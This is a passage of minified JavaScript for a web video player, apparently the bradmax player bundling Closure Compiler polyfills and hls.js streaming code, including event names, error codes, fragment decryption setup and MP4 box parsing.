var $jscomp=$jscomp||{};$jscomp.scope={},$jscomp.ASSUME_ES5=!1,$jscomp.ASSUME_NO_NATIVE_MAP=!1,$jscomp.ASSUME_NO_NATIVE_SET=!1,$jscomp.SIMPLE_FROUND_POLYFILL=!1,$jscomp.ISOLATE_POLYFILLS=!1,$jscomp.defineProperty=$jscomp.ASSUME_ES5||"function"==typeof Object.defineProperties?Object.defineProperty:function(jb,pb,xb){return jb==Array.prototype||jb==Object.prototype||(jb[pb]=xb.value),jb},$jscomp.getGlobal=function(jb){jb=["object"==typeof globalThis&&globalThis,jb,"object"==typeof window&&window,"object"==typeof self&&self,"object"==typeof global&&global];for(var pb=0;pb<jb.length;++pb){var xb=jb[pb];if(xb&&xb.Math==Math)return xb}throw Error("Cannot find global object")},$jscomp.global=$jscomp.getGlobal(this),$jscomp.IS_SYMBOL_NATIVE="function"==typeof Symbol&&"symbol"==typeof Symbol("x"),$jscomp.TRUST_ES6_POLYFILLS=!$jscomp.ISOLATE_POLYFILLS||$jscomp.IS_SYMBOL_NATIVE,$jscomp.polyfills={},$jscomp.propertyToPolyfillSymbol={},$jscomp.POLYFILL_PREFIX="$jscp$";var $jscomp$lookupPolyfilledValue=function(jb,pb){var xb=$jscomp.propertyToPolyfillSymbol[pb];return null==xb?jb[pb]:void 0!==(xb=jb[xb])?xb:jb[pb]};$jscomp.polyfill=function(jb,pb,xb,sb){pb&&($jscomp.ISOLATE_POLYFILLS?$jscomp.polyfillIsolated(jb,pb,xb,sb):$jscomp.polyfillUnisolated(jb,pb,xb,sb))},$jscomp.polyfillUnisolated=function(jb,pb,xb,sb){for(xb=$jscomp.global,jb=jb.split("."),sb=0;sb<jb.length-1;sb++){var Ja=jb[sb];if(!(Ja in xb))return;xb=xb[Ja]}(pb=pb(sb=xb[jb=jb[jb.length-1]]))!=sb&&null!=pb&&$jscomp.defineProperty(xb,jb,{configurable:!0,writable:!0,value:pb})},$jscomp.polyfillIsolated=function(jb,pb,xb,sb){var Ja=jb.split(".");jb=1===Ja.length,sb=Ja[0],sb=!jb&&sb in $jscomp.polyfills?$jscomp.polyfills:$jscomp.global;for(var U=0;U<Ja.length-1;U++){var wa=Ja[U];if(!(wa in sb))return;sb=sb[wa]}Ja=Ja[Ja.length-1],null!=(pb=pb(xb=$jscomp.IS_SYMBOL_NATIVE&&"es6"===xb?sb[Ja]:null))&&(jb?$jscomp.defineProperty($jscomp.polyfills,Ja,{configurable:!0,writable:!0,value:pb}):pb!==xb&&($jscomp.propertyToPolyfillSymbol[Ja]=$jscomp.IS_SYMBOL_NATIVE?$jscomp.global.Symbol(Ja):$jscomp.POLYFILL_PREFIX+Ja,Ja=$jscomp.propertyToPolyfillSymbol[Ja],$jscomp.defineProperty(sb,Ja,{configurable:!0,writable:!0,value:pb})))},$jscomp.polyfill("Number.isFinite",(function(jb){return jb||function(pb){return"number"==typeof pb&&(!isNaN(pb)&&1/0!==pb&&-1/0!==pb)}}),"es6","es3"),$jscomp.polyfill("Number.MAX_SAFE_INTEGER",(function(){return 9007199254740991}),"es6","es3"),$jscomp.underscoreProtoCanBeSet=function(){var pb={};try{return pb.__proto__={a:!0},pb.a}catch(xb){}return!1},$jscomp.setPrototypeOf=$jscomp.TRUST_ES6_POLYFILLS&&"function"==typeof Object.setPrototypeOf?Object.setPrototypeOf:$jscomp.underscoreProtoCanBeSet()?function(jb,pb){if(jb.__proto__=pb,jb.__proto__!==pb)throw new TypeError(jb+" is not extensible");return jb}:null,$jscomp.polyfill("Object.setPrototypeOf",(function(jb){return jb||$jscomp.setPrototypeOf}),"es6","es5"),$jscomp.arrayIteratorImpl=function(jb){var pb=0;return function(){return pb<jb.length?{done:!1,value:jb[pb++]}:{done:!0}}},$jscomp.arrayIterator=function(jb){return{next:$jscomp.arrayIteratorImpl(jb)}},$jscomp.makeIterator=function(jb){var pb="undefined"!=typeof Symbol&&Symbol.iterator&&jb[Symbol.iterator];return pb?pb.call(jb):$jscomp.arrayIterator(jb)},$jscomp.FORCE_POLYFILL_PROMISE=!1,$jscomp.polyfill("Promise",(function(jb){function pb(){this.batch_=null}function xb(wa){return wa instanceof Ja?wa:new Ja((function(Va,Na){Va(wa)}))}if(jb&&!$jscomp.FORCE_POLYFILL_PROMISE)return jb;pb.prototype.asyncExecute=function(wa){if(null==this.batch_){this.batch_=[];var Va=this;this.asyncExecuteFunction((function(){Va.executeBatch_()}))}this.batch_.push(wa)};var sb=$jscomp.global.setTimeout;pb.prototype.asyncExecuteFunction=function(wa){sb(wa,0)},pb.prototype.executeBatch_=function(){for(;this.batch_&&this.batch_.length;){var wa=this.batch_;this.batch_=[];for(var Va=0;Va<wa.length;++Va){var Na=wa[Va];wa[Va]=null;try{Na()}catch(Oa){this.asyncThrow_(Oa)}}}this.batch_=null},pb.prototype.asyncThrow_=function(wa){this.asyncExecuteFunction((function(){throw wa}))};var Ja=function(wa){this.state_=0,this.result_=void 0,this.onSettledCallbacks_=[];var Va=this.createResolveAndReject_();try{wa(Va.resolve,Va.reject)}catch(Na){Va.reject(Na)}};Ja.prototype.createResolveAndReject_=function(){function wa(Oa){return function(u){Na||(Na=!0,Oa.call(Va,u))}}var Va=this,Na=!1;return{resolve:wa(this.resolveTo_),reject:wa(this.reject_)}},Ja.prototype.resolveTo_=function(wa){if(wa===this)this.reject_(new TypeError("A Promise cannot resolve to itself"));else if(wa instanceof Ja)this.settleSameAsPromise_(wa);else{a:switch(typeof wa){case"object":var Va=null!=wa;break a;case"function":Va=!0;break a;default:Va=!1}Va?this.resolveToNonPromiseObj_(wa):this.fulfill_(wa)}},Ja.prototype.resolveToNonPromiseObj_=function(wa){var Va=void 0;try{Va=wa.then}catch(Na){return void this.reject_(Na)}"function"==typeof Va?this.settleSameAsThenable_(Va,wa):this.fulfill_(wa)},Ja.prototype.reject_=function(wa){this.settle_(2,wa)},Ja.prototype.fulfill_=function(wa){this.settle_(1,wa)},Ja.prototype.settle_=function(wa,Va){if(0!=this.state_)throw Error("Cannot settle("+wa+", "+Va+"): Promise already settled in state"+this.state_);this.state_=wa,this.result_=Va,this.executeOnSettledCallbacks_()},Ja.prototype.executeOnSettledCallbacks_=function(){if(null!=this.onSettledCallbacks_){for(var wa=0;wa<this.onSettledCallbacks_.length;++wa)U.asyncExecute(this.onSettledCallbacks_[wa]);this.onSettledCallbacks_=null}};var U=new pb;return Ja.prototype.settleSameAsPromise_=function(wa){var Va=this.createResolveAndReject_();wa.callWhenSettled_(Va.resolve,Va.reject)},Ja.prototype.settleSameAsThenable_=function(wa,Va){var Na=this.createResolveAndReject_();try{wa.call(Va,Na.resolve,Na.reject)}catch(Oa){Na.reject(Oa)}},Ja.prototype.then=function(wa,Va){function Na(M,v){return"function"==typeof M?function(m){try{Oa(M(m))}catch(p){u(p)}}:v}var Oa,u,da=new Ja((function(M,v){Oa=M,u=v}));return this.callWhenSettled_(Na(wa,Oa),Na(Va,u)),da},Ja.prototype.catch=function(wa){return this.then(void 0,wa)},Ja.prototype.callWhenSettled_=function(wa,Va){function Na(){switch(Oa.state_){case 1:wa(Oa.result_);break;case 2:Va(Oa.result_);break;default:throw Error("Unexpected state: "+Oa.state_)}}var Oa=this;null==this.onSettledCallbacks_?U.asyncExecute(Na):this.onSettledCallbacks_.push(Na)},Ja.resolve=xb,Ja.reject=function(wa){return new Ja((function(Va,Na){Na(wa)}))},Ja.race=function(wa){return new Ja((function(Va,Na){for(var Oa=$jscomp.makeIterator(wa),u=Oa.next();!u.done;u=Oa.next())xb(u.value).callWhenSettled_(Va,Na)}))},Ja.all=function(wa){var Va=$jscomp.makeIterator(wa),Na=Va.next();return Na.done?xb([]):new Ja((function(Oa,u){function da(m){return function(p){M[m]=p,0==--v&&Oa(M)}}var M=[],v=0;do{M.push(void 0),v++,xb(Na.value).callWhenSettled_(da(M.length-1),u),Na=Va.next()}while(!Na.done)}))},Ja}),"es6","es3"),$jscomp.owns=function(jb,pb){return Object.prototype.hasOwnProperty.call(jb,pb)},$jscomp.assign=$jscomp.TRUST_ES6_POLYFILLS&&"function"==typeof Object.assign?Object.assign:function(jb,pb){for(var xb=1;xb<arguments.length;xb++){var sb=arguments[xb];if(sb)for(var Ja in sb)$jscomp.owns(sb,Ja)&&(jb[Ja]=sb[Ja])}return jb},$jscomp.polyfill("Object.assign",(function(jb){return jb||$jscomp.assign}),"es6","es3"),$jscomp.initSymbol=function(){},$jscomp.polyfill("Symbol",(function(jb){if(jb)return jb;var pb=function(Ja,U){this.$jscomp$symbol$id_=Ja,$jscomp.defineProperty(this,"description",{configurable:!0,writable:!0,value:U})};pb.prototype.toString=function(){return this.$jscomp$symbol$id_};var xb=0,sb=function(Ja){if(this instanceof sb)throw new TypeError("Symbol is not a constructor");return new pb("jscomp_symbol_"+(Ja||"")+"_"+xb++,Ja)};return sb}),"es6","es3"),$jscomp.initSymbolIterator=function(){},$jscomp.polyfill("Symbol.iterator",(function(jb){if(jb)return jb;jb=Symbol("Symbol.iterator");for(var pb="Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(" "),xb=0;xb<pb.length;xb++){var sb=$jscomp.global[pb[xb]];"function"==typeof sb&&"function"!=typeof sb.prototype[jb]&&$jscomp.defineProperty(sb.prototype,jb,{configurable:!0,writable:!0,value:function(){return $jscomp.iteratorPrototype($jscomp.arrayIteratorImpl(this))}})}return jb}),"es6","es3"),$jscomp.initSymbolAsyncIterator=function(){},$jscomp.iteratorPrototype=function(jb){return(jb={next:jb})[Symbol.iterator]=function(){return this},jb},$jscomp.iteratorFromArray=function(jb,pb){jb instanceof String&&(jb+="");var xb=0,sb={next:function(){if(xb<jb.length){var Ja=xb++;return{value:pb(Ja,jb[Ja]),done:!1}}return sb.next=function(){return{done:!0,value:void 0}},sb.next()}};return sb[Symbol.iterator]=function(){return sb},sb},$jscomp.polyfill("Array.prototype.keys",(function(jb){return jb||function(){return $jscomp.iteratorFromArray(this,(function(pb){return pb}))}}),"es6","es3"),$jscomp.polyfill("Reflect",(function(jb){return jb||{}}),"es6","es3"),$jscomp.objectCreate=$jscomp.ASSUME_ES5||"function"==typeof Object.create?Object.create:function(jb){var pb=function(){};return pb.prototype=jb,new pb},$jscomp.getConstructImplementation=function(){if($jscomp.TRUST_ES6_POLYFILLS&&"undefined"!=typeof Reflect&&Reflect.construct){if(function jb(){function xb(){}return new xb,Reflect.construct(xb,[],(function(){})),new xb instanceof xb}())return Reflect.construct;var pb=Reflect.construct;return function(xb,sb,Ja){return xb=pb(xb,sb),Ja&&Reflect.setPrototypeOf(xb,Ja.prototype),xb}}return function(xb,sb,Ja){return void 0===Ja&&(Ja=xb),Ja=$jscomp.objectCreate(Ja.prototype||Object.prototype),Function.prototype.apply.call(xb,Ja,sb)||Ja}},$jscomp.construct=$jscomp.getConstructImplementation(),$jscomp.polyfill("Reflect.construct",(function(jb){return $jscomp.construct}),"es6","es3"),$jscomp.polyfill("Array.prototype.values",(function(jb){return jb||function(){return $jscomp.iteratorFromArray(this,(function(pb,xb){return xb}))}}),"es8","es3"),$jscomp.polyfill("Array.prototype.fill",(function(jb){return jb||function(pb,xb,sb){var Ja=this.length||0;for(0>xb&&(xb=Math.max(0,Ja+xb)),(null==sb||sb>Ja)&&(sb=Ja),0>(sb=Number(sb))&&(sb=Math.max(0,Ja+sb)),xb=Number(xb||0);xb<sb;xb++)this[xb]=pb;return this}}),"es6","es3"),$jscomp.typedArrayFill=function(jb){return jb||Array.prototype.fill},$jscomp.polyfill("Int8Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Uint8Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Uint8ClampedArray.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Int16Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Uint16Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Int32Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Uint32Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Float32Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Float64Array.prototype.fill",$jscomp.typedArrayFill,"es6","es5"),$jscomp.polyfill("Object.getOwnPropertySymbols",(function(jb){return jb||function(){return[]}}),"es6","es5"),$jscomp.polyfill("Reflect.ownKeys",(function(jb){return jb||function(pb){var xb=[],sb=Object.getOwnPropertyNames(pb);pb=Object.getOwnPropertySymbols(pb);for(var Ja=0;Ja<sb.length;Ja++)("jscomp_symbol_"==sb[Ja].substring(0,14)?pb:xb).push(sb[Ja]);return xb.concat(pb)}}),"es6","es5"),$jscomp.polyfill("Math.sign",(function(jb){return jb||function(pb){return 0===(pb=Number(pb))||isNaN(pb)?pb:0<pb?1:-1}}),"es6","es3"),$jscomp.polyfill("String.fromCodePoint",(function(jb){return jb||function(pb){for(var xb="",sb=0;sb<arguments.length;sb++){var Ja=Number(arguments[sb]);if(0>Ja||1114111<Ja||Ja!==Math.floor(Ja))throw new RangeError("invalid_code_point "+Ja);65535>=Ja?xb+=String.fromCharCode(Ja):(Ja-=65536,xb+=String.fromCharCode(Ja>>>10&1023|55296),xb+=String.fromCharCode(1023&Ja|56320))}return xb}}),"es6","es3"),$jscomp.polyfill("Number.isInteger",(function(jb){return jb||function(pb){return!!Number.isFinite(pb)&&pb===Math.floor(pb)}}),"es6","es3"),$jscomp.polyfill("Array.from",(function(jb){return jb||function(pb,xb,sb){xb=null!=xb?xb:function(Va){return Va};var Ja=[],U="undefined"!=typeof Symbol&&Symbol.iterator&&pb[Symbol.iterator];if("function"==typeof U){pb=U.call(pb);for(var wa=0;!(U=pb.next()).done;)Ja.push(xb.call(sb,U.value,wa++))}else for(U=pb.length,wa=0;wa<U;wa++)Ja.push(xb.call(sb,pb[wa],wa));return Ja}}),"es6","es3"),$jscomp.checkStringArgs=function(jb,pb,xb){if(null==jb)throw new TypeError("The 'this' value for String.prototype."+xb+" must not be null or undefined");if(pb instanceof RegExp)throw new TypeError("First argument to String.prototype."+xb+" must not be a regular expression");return jb+""},$jscomp.polyfill("String.prototype.startsWith",(function(jb){return jb||function(pb,xb){var sb=$jscomp.checkStringArgs(this,pb,"startsWith");pb+="";var Ja=sb.length,U=pb.length;xb=Math.max(0,Math.min(0|xb,sb.length));for(var wa=0;wa<U&&xb<Ja;)if(sb[xb++]!=pb[wa++])return!1;return wa>=U}}),"es6","es3"),$jscomp.polyfill("Array.prototype.entries",(function(jb){return jb||function(){return $jscomp.iteratorFromArray(this,(function(pb,xb){return[pb,xb]}))}}),"es6","es3"),$jscomp.polyfill("String.prototype.endsWith",(function(jb){return jb||function(pb,xb){var sb=$jscomp.checkStringArgs(this,pb,"endsWith");pb+="",void 0===xb&&(xb=sb.length),xb=Math.max(0,Math.min(0|xb,sb.length));for(var Ja=pb.length;0<Ja&&0<xb;)if(sb[--xb]!=pb[--Ja])return!1;return 0>=Ja}}),"es6","es3"),function(jb,pb){"object"==typeof exports&&"undefined"!=typeof module?pb(exports):"function"==typeof define&&define.amd?define(["exports"],pb):pb((jb=jb||self).bradmax={})}(this,(function(jb){var sb,wa,Va,Na,pb={};if(window.bradmax||(window.bradmax={}),window.bradmax.jsdependency||(window.bradmax.jsdependency={}),!window.bradmax.jsdependency.js_a09afed8bb3673fe6880e9550144541a){window.bradmax.jsdependency.js_a09afed8bb3673fe6880e9550144541a=!0;try{var xb={};xb.exports&&(pb.header=xb.exports)}catch(sb){console.error(sb)}}if(window.bradmax||(window.bradmax={}),window.bradmax.jsdependency||(window.bradmax.jsdependency={}),!window.bradmax.jsdependency.js_d493ed25c95ed67446c3f5fe876487b8){window.bradmax.jsdependency.js_d493ed25c95ed67446c3f5fe876487b8=!0;try{xb={},function(sb,Ja,U){var wa,Va;void 0!==sb&&(wa=this,Va=function(){return function(wa){function Va(Oa){if(Na[Oa])return Na[Oa].exports;var u=Na[Oa]={i:Oa,l:!1,exports:{}};return wa[Oa].call(u.exports,u,u.exports,Va),u.l=!0,u.exports}var Na={};return Va.m=wa,Va.c=Na,Va.d=function(Oa,u,da){Va.o(Oa,u)||Object.defineProperty(Oa,u,{enumerable:!0,get:da})},Va.r=function(Oa){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(Oa,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(Oa,"__esModule",{value:!0})},Va.t=function(Oa,u){if(1&u&&(Oa=Va(Oa)),8&u||4&u&&"object"==typeof Oa&&Oa&&Oa.__esModule)return Oa;var da=Object.create(null);if(Va.r(da),Object.defineProperty(da,"default",{enumerable:!0,value:Oa}),2&u&&"string"!=typeof Oa)for(var M in Oa)Va.d(da,M,function(v){return Oa[v]}.bind(null,M));return da},Va.n=function(Oa){var u=Oa&&Oa.__esModule?function(){return Oa.default}:function(){return Oa};return Va.d(u,"a",u),u},Va.o=function(Oa,u){return Object.prototype.hasOwnProperty.call(Oa,u)},Va.p="/dist/",Va(Va.s=19)}([function(wa,Va,Na){var Oa,u;Na.d(Va,"a",(function(){return Oa})),(u=Oa||(Oa={})).MEDIA_ATTACHING="hlsMediaAttaching",u.MEDIA_ATTACHED="hlsMediaAttached",u.MEDIA_DETACHING="hlsMediaDetaching",u.MEDIA_DETACHED="hlsMediaDetached",u.BUFFER_RESET="hlsBufferReset",u.BUFFER_CODECS="hlsBufferCodecs",u.BUFFER_CREATED="hlsBufferCreated",u.BUFFER_APPENDING="hlsBufferAppending",u.BUFFER_APPENDED="hlsBufferAppended",u.BUFFER_EOS="hlsBufferEos",u.BUFFER_FLUSHING="hlsBufferFlushing",u.BUFFER_FLUSHED="hlsBufferFlushed",u.MANIFEST_LOADING="hlsManifestLoading",u.MANIFEST_LOADED="hlsManifestLoaded",u.MANIFEST_PARSED="hlsManifestParsed",u.LEVEL_SWITCHING="hlsLevelSwitching",u.LEVEL_SWITCHED="hlsLevelSwitched",u.LEVEL_LOADING="hlsLevelLoading",u.LEVEL_LOADED="hlsLevelLoaded",u.LEVEL_UPDATED="hlsLevelUpdated",u.LEVEL_PTS_UPDATED="hlsLevelPtsUpdated",u.LEVELS_UPDATED="hlsLevelsUpdated",u.AUDIO_TRACKS_UPDATED="hlsAudioTracksUpdated",u.AUDIO_TRACK_SWITCHING="hlsAudioTrackSwitching",u.AUDIO_TRACK_SWITCHED="hlsAudioTrackSwitched",u.AUDIO_TRACK_LOADING="hlsAudioTrackLoading",u.AUDIO_TRACK_LOADED="hlsAudioTrackLoaded",u.SUBTITLE_TRACKS_UPDATED="hlsSubtitleTracksUpdated",u.SUBTITLE_TRACKS_CLEARED="hlsSubtitleTracksCleared",u.SUBTITLE_TRACK_SWITCH="hlsSubtitleTrackSwitch",u.SUBTITLE_TRACK_LOADING="hlsSubtitleTrackLoading",u.SUBTITLE_TRACK_LOADED="hlsSubtitleTrackLoaded",u.SUBTITLE_FRAG_PROCESSED="hlsSubtitleFragProcessed",u.CUES_PARSED="hlsCuesParsed",u.NON_NATIVE_TEXT_TRACKS_FOUND="hlsNonNativeTextTracksFound",u.INIT_PTS_FOUND="hlsInitPtsFound",u.FRAG_LOADING="hlsFragLoading",u.FRAG_LOAD_EMERGENCY_ABORTED="hlsFragLoadEmergencyAborted",u.FRAG_LOADED="hlsFragLoaded",u.FRAG_DECRYPTED="hlsFragDecrypted",u.FRAG_PARSING_INIT_SEGMENT="hlsFragParsingInitSegment",u.FRAG_PARSING_USERDATA="hlsFragParsingUserdata",u.FRAG_PARSING_METADATA="hlsFragParsingMetadata",u.FRAG_PARSED="hlsFragParsed",u.FRAG_BUFFERED="hlsFragBuffered",u.FRAG_CHANGED="hlsFragChanged",u.FPS_DROP="hlsFpsDrop",u.FPS_DROP_LEVEL_CAPPING="hlsFpsDropLevelCapping",u.ERROR="hlsError",u.DESTROYING="hlsDestroying",u.KEY_LOADING="hlsKeyLoading",u.KEY_LOADED="hlsKeyLoaded",u.LIVE_BACK_BUFFER_REACHED="hlsLiveBackBufferReached",u.BACK_BUFFER_REACHED="hlsBackBufferReached"},function(wa,Va,Na){function Oa(m){if(self.console&&!0===m||"object"==typeof m){!function(p){for(var l=arguments.length,f=Array(1<l?l-1:0),g=1;g<l;g++)f[g-1]=arguments[g];f.forEach((function(t){var r=M,x=p[t]?p[t].bind(p):(x=self.console[t])?x.bind(self.console,"["+t+"] >"):u;r[t]=x}))}(m,"debug","log","info","warn","error");try{M.log()}catch(p){M=da}}else M=da}Na.d(Va,"a",(function(){return Oa})),Na.d(Va,"b",(function(){return v}));var u=function(){},da={trace:u,debug:u,log:u,warn:u,info:u,error:u},M=da,v=da},function(wa,Va,Na){var Oa,u,da;Na.d(Va,"b",(function(){return Oa})),Na.d(Va,"a",(function(){return u})),(da=Oa||(Oa={})).NETWORK_ERROR="networkError",da.MEDIA_ERROR="mediaError",da.KEY_SYSTEM_ERROR="keySystemError",da.MUX_ERROR="muxError",da.OTHER_ERROR="otherError",function(da){da.KEY_SYSTEM_NO_KEYS="keySystemNoKeys",da.KEY_SYSTEM_NO_ACCESS="keySystemNoAccess",da.KEY_SYSTEM_NO_SESSION="keySystemNoSession",da.KEY_SYSTEM_LICENSE_REQUEST_FAILED="keySystemLicenseRequestFailed",da.KEY_SYSTEM_NO_INIT_DATA="keySystemNoInitData",da.MANIFEST_LOAD_ERROR="manifestLoadError",da.MANIFEST_LOAD_TIMEOUT="manifestLoadTimeOut",da.MANIFEST_PARSING_ERROR="manifestParsingError",da.MANIFEST_INCOMPATIBLE_CODECS_ERROR="manifestIncompatibleCodecsError",da.LEVEL_EMPTY_ERROR="levelEmptyError",da.LEVEL_LOAD_ERROR="levelLoadError",da.LEVEL_LOAD_TIMEOUT="levelLoadTimeOut",da.LEVEL_SWITCH_ERROR="levelSwitchError",da.AUDIO_TRACK_LOAD_ERROR="audioTrackLoadError",da.AUDIO_TRACK_LOAD_TIMEOUT="audioTrackLoadTimeOut",da.SUBTITLE_LOAD_ERROR="subtitleTrackLoadError",da.SUBTITLE_TRACK_LOAD_TIMEOUT="subtitleTrackLoadTimeOut",da.FRAG_LOAD_ERROR="fragLoadError",da.FRAG_LOAD_TIMEOUT="fragLoadTimeOut",da.FRAG_DECRYPT_ERROR="fragDecryptError",da.FRAG_PARSING_ERROR="fragParsingError",da.REMUX_ALLOC_ERROR="remuxAllocError",da.KEY_LOAD_ERROR="keyLoadError",da.KEY_LOAD_TIMEOUT="keyLoadTimeOut",da.BUFFER_ADD_CODEC_ERROR="bufferAddCodecError",da.BUFFER_INCOMPATIBLE_CODECS_ERROR="bufferIncompatibleCodecsError",da.BUFFER_APPEND_ERROR="bufferAppendError",da.BUFFER_APPENDING_ERROR="bufferAppendingError",da.BUFFER_STALLED_ERROR="bufferStalledError",da.BUFFER_FULL_ERROR="bufferFullError",da.BUFFER_SEEK_OVER_HOLE="bufferSeekOverHole",da.BUFFER_NUDGE_ON_STALL="bufferNudgeOnStall",da.INTERNAL_EXCEPTION="internalException",da.INTERNAL_ABORTED="aborted",da.UNKNOWN="unknown"}(u||(u={}))},function(wa,Va,Na){Na.d(Va,"a",(function(){return Oa}));var Oa=Number.isFinite||function(u){return"number"==typeof u&&isFinite(u)};Number.MAX_SAFE_INTEGER},function(wa,Va,Na){function Oa(x,z){x.prototype=Object.create(z.prototype),x.prototype.constructor=x,u(x,z)}function u(x,z){return(u=Object.setPrototypeOf||function(J,E){return J.__proto__=E,J})(x,z)}function da(x,z){for(var J=0;J<z.length;J++){var E=z[J];E.enumerable=E.enumerable||!1,E.configurable=!0,"value"in E&&(E.writable=!0),Object.defineProperty(x,E.key,E)}}function M(x,z,J){return z&&da(x.prototype,z),J&&da(x,J),x}Na.d(Va,"a",(function(){return v})),Na.d(Va,"b",(function(){return t})),Na.d(Va,"c",(function(){return r}));var v,x,m=Na(3),p=Na(10),l=Na(1),f=Na(16),g=Na(11);(x=v||(v={})).AUDIO="audio",x.VIDEO="video",x.AUDIOVIDEO="audiovideo",wa=function(){function x(z){var J;this._url=this._byteRange=null,this.relurl=void 0,this.elementaryStreams=((J={})[v.AUDIO]=null,J[v.VIDEO]=null,J[v.AUDIOVIDEO]=null,J),this.baseurl=z}return x.prototype.setByteRange=function(z,J){var E=[];1===(z=z.split("@",2)).length?E[0]=J?J.byteRangeEndOffset:0:E[0]=parseInt(z[1]),E[1]=parseInt(z[0])+E[0],this._byteRange=E},M(x,[{key:"byteRange",get:function(){return this._byteRange?this._byteRange:[]}},{key:"byteRangeStartOffset",get:function(){return this.byteRange[0]}},{key:"byteRangeEndOffset",get:function(){return this.byteRange[1]}},{key:"url",get:function(){return!this._url&&this.baseurl&&this.relurl&&(this._url=Object(p.buildAbsoluteURL)(this.baseurl,this.relurl,{alwaysNormalize:!0})),this._url||""},set:function(z){this._url=z}}]),x}();var t=function(x){function z(E,D){var I;return(I=x.call(this,D)||this)._decryptdata=null,I.rawProgramDateTime=null,I.programDateTime=null,I.tagList=[],I.duration=0,I.sn=0,I.levelkey=void 0,I.type=void 0,I.loader=null,I.level=-1,I.cc=0,I.startPTS=void 0,I.endPTS=void 0,I.appendedPTS=void 0,I.startDTS=void 0,I.endDTS=void 0,I.start=0,I.deltaPTS=void 0,I.maxStartPTS=void 0,I.minEndPTS=void 0,I.stats=new g.a,I.urlId=0,I.data=void 0,I.bitrateTest=!1,I.title=null,I.type=E,I}Oa(z,x);var J=z.prototype;return J.createInitializationVector=function(E){for(var D=new Uint8Array(16),I=12;16>I;I++)D[I]=E>>8*(15-I)&255;return D},J.setDecryptDataFromLevelKey=function(E,D){var I=E;return"AES-128"===(null==E?void 0:E.method)&&E.uri&&!E.iv&&((I=f.a.fromURI(E.uri)).method=E.method,I.iv=this.createInitializationVector(D),I.keyFormat="identity"),I},J.setElementaryStreamInfo=function(E,D,I,L,G,N){void 0===N&&(N=!1);var w=this.elementaryStreams,h=w[E];h?(h.startPTS=Math.min(h.startPTS,D),h.endPTS=Math.max(h.endPTS,I),h.startDTS=Math.min(h.startDTS,L),h.endDTS=Math.max(h.endDTS,G)):w[E]={startPTS:D,endPTS:I,startDTS:L,endDTS:G,partial:N}},J.clearElementaryStreamInfo=function(){var E=this.elementaryStreams;E[v.AUDIO]=null,E[v.VIDEO]=null,E[v.AUDIOVIDEO]=null},M(z,[{key:"decryptdata",get:function(){if(!this.levelkey&&!this._decryptdata)return null;if(!this._decryptdata&&this.levelkey){var E=this.sn;"number"!=typeof E&&(this.levelkey&&"AES-128"===this.levelkey.method&&!this.levelkey.iv&&l.b.warn('missing IV for initialization segment with method="'+this.levelkey.method+'" - compliance issue'),E=0),this._decryptdata=this.setDecryptDataFromLevelKey(this.levelkey,E)}return this._decryptdata}},{key:"end",get:function(){return this.start+this.duration}},{key:"endProgramDateTime",get:function(){if(null===this.programDateTime||!Object(m.a)(this.programDateTime))return null;var E=Object(m.a)(this.duration)?this.duration:0;return this.programDateTime+1e3*E}},{key:"encrypted",get:function(){var E;return!(null===(E=this.decryptdata)||void 0===E||!E.keyFormat||!this.decryptdata.uri)}}]),z}(wa),r=function(x){function z(J,E,D,I,L){return(D=x.call(this,D)||this).fragOffset=0,D.duration=0,D.gap=!1,D.independent=!1,D.relurl=void 0,D.fragment=void 0,D.index=void 0,D.stats=new g.a,D.duration=J.decimalFloatingPoint("DURATION"),D.gap=J.bool("GAP"),D.independent=J.bool("INDEPENDENT"),D.relurl=J.enumeratedString("URI"),D.fragment=E,D.index=I,(J=J.enumeratedString("BYTERANGE"))&&D.setByteRange(J,L),L&&(D.fragOffset=L.fragOffset+L.duration),D}return Oa(z,x),M(z,[{key:"start",get:function(){return this.fragment.start+this.fragOffset}},{key:"end",get:function(){return this.start+this.duration}},{key:"loaded",get:function(){var J=this.elementaryStreams;return!!(J.audio||J.video||J.audiovideo)}}]),z}(wa)},function(wa,Va,Na){function Oa(E,D){return"data"in E&&(D+=E.start,E=E.data),0>(E=E[D]<<24|E[D+1]<<16|E[D+2]<<8|E[D+3])?4294967296+E:E}function u(E,D,I){"data"in E&&(D+=E.start,E=E.data),E[D]=I>>24,E[D+1]=I>>16&255,E[D+2]=I>>8&255,E[D+3]=255&I}function da(E,D){var I,L,G,N=[];if(!D.length)return N;"data"in E?(I=E.data,L=E.start,G=E.end):(L=0,G=(I=E).byteLength);for(E=L;E<G;)L=1<(L=Oa(I,E))?E+L:G,String.fromCharCode.apply(null,I.subarray(E+4,E+8))===D[0]&&(1===D.length?N.push({data:I,start:E+8,end:L}):(E=da({data:I,start:E+8,end:L},D.slice(1))).length&&J.apply(N,E)),E=L;return N}function M(E){var D=da(E,["moov"])[0];D=D?D.end:null;var I=da(E,["sidx"]);if(!I||!I[0])return null;E=[];var L=(I=I[0]).data[0],G=0===L?8:16,N=Oa(I,G);G=G+4+(0===L?8:16)+2;var w=I.end+0,h=I,F=G;"data"in h&&(F+=h.start,h=h.data),h=0>(h=h[F]<<8|h[F+1])?65536+h:h,G+=2;for(F=0;F<h;F++){var P=Oa(I,G);G+=4;var O=2147483647&P;if(1==(2147483648&P)>>>31)return console.warn("SIDX has hierarchical references (not supported)"),null;P=Oa(I,G),G+=4,E.push({referenceSize:O,subsegmentDuration:P,info:{duration:P/N,start:w,end:w+O-1}}),w+=O,G+=4}return{earliestPresentationTime:0,timescale:N,version:L,referencesCount:h,references:E,moovEndOffset:D}}function v(E){for(var D=[],I=da(E,["moov","trak"]),L=0;L<I.length;L++){var G=I[L],N=da(G,["tkhd"])[0];if(N){var w=N.data[N.start];N=Oa(N,w=0===w?12:20);var 